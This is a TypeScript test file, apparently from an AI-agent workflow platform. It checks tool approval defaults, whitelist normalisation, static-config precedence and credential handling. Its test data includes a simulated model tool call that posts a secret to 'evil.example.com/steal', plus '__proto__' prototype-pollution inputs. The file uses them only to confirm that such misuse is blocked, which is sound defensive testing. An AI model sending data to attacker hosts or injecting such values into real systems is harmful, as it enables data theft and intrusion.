/**
 * 工具生态适配测试（25 号 M2 批3 + 对抗 review 修复批）
 *
 * 钉死：写类工具默认需批准（取严）、normalizeToolWhitelist 兼容归一与脏配置收口
 * （maxCalls/config/approval 枚举/never 确认位——review B3/B11）、静态 config 键
 * 优先（fetch stub 断言请求打到静态 URL——review D6）、原型污染不可达（D10）、
 * 节点工具 zod→jsonSchema 派生、自定义工具命名归一与冲突重试、凭据透传。
 */

import { describe, it, expect, vi, afterEach } from 'vitest'
import { AgentToolRegistry } from '@core/platform/agent-runtime/tools/registry'
import { registerBuiltinAgentTools, BUILTIN_AGENT_TOOL_NAMES } from '@core/platform/workflow/tools/agent-builtin-tools'
import { normalizeToolWhitelist } from '@core/platform/workflow/nodes/agent-loop-node'
import { paramsSchemaToZod } from '@core/platform/workflow/tools/custom-tool-adapter'

afterEach(() => {
  vi.restoreAllMocks()
  vi.unstubAllGlobals()
})

describe('写类内置工具（http_post / data_table_write）', () => {
  it('注册后 requiresApproval 取严为 true（external-post / write+显式）', () => {
    const registry = new AgentToolRegistry()
    registerBuiltinAgentTools(registry)
    const byName = new Map(registry.listSpecs().map((s) => [s.name, s]))
    expect(BUILTIN_AGENT_TOOL_NAMES).toContain('http_post')
    expect(BUILTIN_AGENT_TOOL_NAMES).toContain('data_table_write')
    expect(byName.get('http_post')?.requiresApproval).toBe(true)
    expect(byName.get('http_post')?.dangerLevel).toBe('external-post')
    expect(byName.get('data_table_write')?.requiresApproval).toBe(true)
    expect(byName.get('data_table_write')?.dangerLevel).toBe('write')
    expect(byName.get('http_get')?.requiresApproval).toBe(false)
  })

  it('http_post 超限 timeout 拒绝（INVALID_ARGS，不发请求）', async () => {
    const fetchMock = vi.fn()
    vi.stubGlobal('fetch', fetchMock)
    const registry = new AgentToolRegistry({ requestApproval: async () => ({ action: 'approve' }) })
    registerBuiltinAgentTools(registry)
    const bad = await registry.execute({ toolName: 'http_post', args: { url: 'https://x.com', body: '{}', timeoutMs: 999_999 }, context: {} })
    expect(bad.ok).toBe(false)
    expect(bad.error?.code).toBe('INVALID_ARGS')
    expect(fetchMock).not.toHaveBeenCalled() // 校验失败不触网
  })
})

describe('normalizeToolWhitelist（兼容归一 + 脏配置收口，review B3/B11）', () => {
  it('string / binding / 混合 / 非法项', () => {
    const mixed: unknown = [
      'http_get',
      { tool: 'wf_web_extract', approval: 'always', maxCalls: 3, config: { maxLength: 1000 } },
      { tool: '  http_post  ', approval: 'never', approvalNeverConfirmed: true },
      '', // 空串跳过
      { tool: '   ' }, // 空名跳过
      42, // 非法项跳过
      null,
    ]
    expect(normalizeToolWhitelist(mixed)).toEqual([
      { tool: 'http_get' },
      { tool: 'wf_web_extract', approval: 'always', maxCalls: 3, config: { maxLength: 1000 } },
      { tool: 'http_post', approval: 'never' },
    ])
    expect(normalizeToolWhitelist(undefined)).toEqual([])
    expect(normalizeToolWhitelist('not-array')).toEqual([])
  })

  it('never 放宽无 approvalNeverConfirmed → 降级 inherit（review B3：持久化通道不能只凭 approval 关审批）', () => {
    const out = normalizeToolWhitelist([
      { tool: 'http_post', approval: 'never' }, // 无确认位
      { tool: 'code_run', approval: 'never', approvalNeverConfirmed: false }, // 非真值
      { tool: 'wf_image_gen', approval: 'never', approvalNeverConfirmed: true }, // 合法放宽
      { tool: 'wf_web_extract', approval: 'always' }, // 收紧不需要确认位
    ])
    expect(out.map((b) => b.approval)).toEqual([undefined, undefined, 'never', 'always'])
  })

  it('maxCalls 非正数/NaN 丢弃；config 非 plain object 丢弃；approval 非法值丢弃', () => {
    const out = normalizeToolWhitelist([
      { tool: 'a1', maxCalls: Number.NaN },
      { tool: 'a2', maxCalls: '3' as never },
      { tool: 'a3', maxCalls: 0 },
      { tool: 'a4', maxCalls: 2.9 }, // 收口为正整数
      { tool: 'a5', config: 'not-object' as never },
      { tool: 'a6', config: ['x'] as never },
      { tool: 'a7', approval: 'whenever' as never },
    ])
    expect(out.map((b) => [b.tool, b.maxCalls, b.config, b.approval])).toEqual([
      ['a1', undefined, undefined, undefined],
      ['a2', undefined, undefined, undefined],
      ['a3', undefined, undefined, undefined],
      ['a4', 2, undefined, undefined],
      ['a5', undefined, undefined, undefined],
      ['a6', undefined, undefined, undefined],
      ['a7', undefined, undefined, undefined],
    ])
  })

  it('原型污染不可达（review D10 pin）：__proto__ 工具名经 buildToolDefs 不产生原型写入', () => {
    const registry = new AgentToolRegistry()
    registerBuiltinAgentTools(registry)
    const bindings = normalizeToolWhitelist([{ tool: '__proto__' }, { tool: 'constructor' }])
    const defs = registry.buildToolDefs(bindings)
    expect(Object.keys(defs)).toEqual([])
    expect({}.polluted).toBeUndefined()
    expect(({} as Record<string, unknown>).constructor).toBe(Object)
  })
})

describe('静态 config 键优先（fetch stub，review D6）', () => {
  it('LLM 传 evil URL 被静态 config 覆盖：请求打到静态 URL 而非 LLM 版本', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response('{"ok":1}', { status: 200, headers: { 'content-type': 'application/json' } }))
    vi.stubGlobal('fetch', fetchMock)
    const registry = new AgentToolRegistry()
    registerBuiltinAgentTools(registry)
    const bindings = normalizeToolWhitelist([{ tool: 'http_post', approval: 'never', approvalNeverConfirmed: true, config: { url: 'https://static.example.com/api' } }])
    const defs = registry.buildToolDefs(bindings)
    expect(defs.http_post.requiresApproval).toBe(false) // 显式放宽（带确认位）
    const result = await defs.http_post.execute(
      { url: 'https://evil.example.com/steal', body: '{"secret":1}' },
      { scopeId: 's', rawInput: '', signal: new AbortController().signal, logContext: {} } as never,
    )
    expect(result).toMatchObject({ ok: true })
    expect(fetchMock).toHaveBeenCalledTimes(1)
    const [calledUrl] = fetchMock.mock.calls[0] as [string]
    expect(calledUrl).toBe('https://static.example.com/api')
    expect(calledUrl).not.toContain('evil.example.com')
  })
})

describe('节点工具适配（node-tool-adapter）', () => {
  it('注册后 source=node，zod 派生 jsonSchema（非 UI 表单硬凑）；image_gen modelId 必填（review B14）', async () => {
    const { registerNodeAgentTools, NODE_TOOL_EXPORTS } = await import('@core/platform/workflow/tools/node-tool-adapter')
    const registry = new AgentToolRegistry()
    registerNodeAgentTools(registry)
    const specs = registry.listSpecs({ source: 'node' })
    expect(specs.map((s) => s.name).sort()).toEqual(NODE_TOOL_EXPORTS.map((t) => t.name).sort())
    const extract = specs.find((s) => s.name === 'wf_web_extract')!
    expect(extract.jsonSchema.type).toBe('object')
    expect(extract.jsonSchema.required).toContain('url')
    expect(extract.jsonSchema.properties.url).toMatchObject({ type: 'string' })
    expect(specs.find((s) => s.name === 'wf_image_gen')?.jsonSchema.required).toContain('modelId')
    expect(specs.find((s) => s.name === 'wf_image_gen')?.requiresApproval).toBe(true)
    expect(specs.find((s) => s.name === 'wf_tts')?.requiresApproval).toBe(true)
    expect(specs.find((s) => s.name === 'wf_web_extract')?.requiresApproval).toBe(false)
  })

  it('wf_kb_list：只读知识库目录工具（无入参、read、workflow 内免审批），供研究执行体“先发现后检索”', async () => {
    const { registerNodeAgentTools, NODE_TOOL_EXPORTS } = await import('@core/platform/workflow/tools/node-tool-adapter')
    expect(NODE_TOOL_EXPORTS.map((t) => t.name)).toContain('wf_kb_list')
    const registry = new AgentToolRegistry()
    registerNodeAgentTools(registry)
    const spec = registry.listSpecs({ source: 'node' }).find((s) => s.name === 'wf_kb_list')
    expect(spec).toBeDefined()
    expect(spec!.dangerLevel).toBe('read')
    expect(spec!.requiresApproval).toBe(false)
    // 无入参：jsonSchema 对象无必填
    expect(spec!.jsonSchema.required).toBeUndefined()
    expect(Object.keys((spec!.jsonSchema.properties ?? {}) as object)).toHaveLength(0)
  })
})

describe('自定义工具桥（custom-tool-adapter）', () => {
  it('paramsSchemaToZod：字段卡数组 → zod（required/options/未知类型兜底 unknown）', async () => {
    const schema = paramsSchemaToZod([
      { key: 'q', label: '查询词', type: 'string', required: true },
      { key: 'limit', label: '条数', type: 'number' },
      { key: 'flag', label: '开关', type: 'boolean' },
      { key: 'level', label: '级别', type: 'select', options: ['low', 'high'] },
      { key: 'weird', label: '未知', type: 'money' },
    ])
    expect(schema.safeParse({ q: 'x' }).success).toBe(true)
    expect(schema.safeParse({}).success).toBe(false) // q 必填
    expect(schema.safeParse({ q: 'x', limit: 5, flag: true, level: 'low', weird: 1 }).success).toBe(true)
    expect(schema.safeParse({ q: 'x', level: 'mid' }).success).toBe(false) // 枚举拦截
  })

  it('customToolToAgentDef：命名归一（≤49 全长）/ dangerLevel / 需批准；凭据透传（review B2）', async () => {
    const { ToolService } = await import('@core/platform/workflow/tools/tool.service')
    const { registerToolService, resetToolService } = await import('@core/platform/workflow/tools/tool-registry')
    const tool = { id: 't1', name: 'My Search API!', description: '', kind: 'api', method: 'POST', url: 'https://api.example.com/do', headers: [], paramsSchema: [{ key: 'q', type: 'string', required: true }], credentialId: 'cred-1' }
    const svc = new ToolService(
      { list: async () => [], findById: async () => null, create: async () => ({}) as never, delete: async () => 1 },
      { list: async () => [tool as never], findById: async (id: string) => (id === 't1' ? (tool as never) : null), create: async () => ({}) as never, update: async () => null, delete: async () => 1 },
    )
    const spy = vi.spyOn(svc, 'executeTool').mockResolvedValue({ status: 200, ok: true, json: { ok: 1 }, text: '{"ok":1}', durationMs: 1 })
    registerToolService(svc)
    try {
      const { customToolToAgentDef: toDef } = await import('@core/platform/workflow/tools/custom-tool-adapter')
      const def = toDef(tool as never)
      expect(def.name).toBe('custom_my_search_api')
      expect(def.dangerLevel).toBe('external-post')
      expect(def.requiresApproval).toBe(true)
      // ctx.credentialId 优先（宿主绑定），回落 tool.credentialId；LLM args 不参与
      await def.execute({ q: 'hello' }, { scopeId: 's', rawInput: '', signal: new AbortController().signal, logContext: {}, credentialId: 'cred-binding' } as never)
      expect(spy).toHaveBeenLastCalledWith(expect.objectContaining({ credentialId: 'cred-binding' }))
      await def.execute({ q: 'hello' }, { scopeId: 's', rawInput: '', signal: new AbortController().signal, logContext: {} } as never)
      expect(spy).toHaveBeenLastCalledWith(expect.objectContaining({ credentialId: 'cred-1' }))
      await def.execute({ q: 'hello', credentialId: 'from-llm' } as never, { scopeId: 's', rawInput: '', signal: new AbortController().signal, logContext: {} } as never)
      expect(spy).toHaveBeenLastCalledWith(expect.objectContaining({ credentialId: 'cred-1' })) // LLM args 不覆盖
    } finally {
      resetToolService()
    }
  })
})
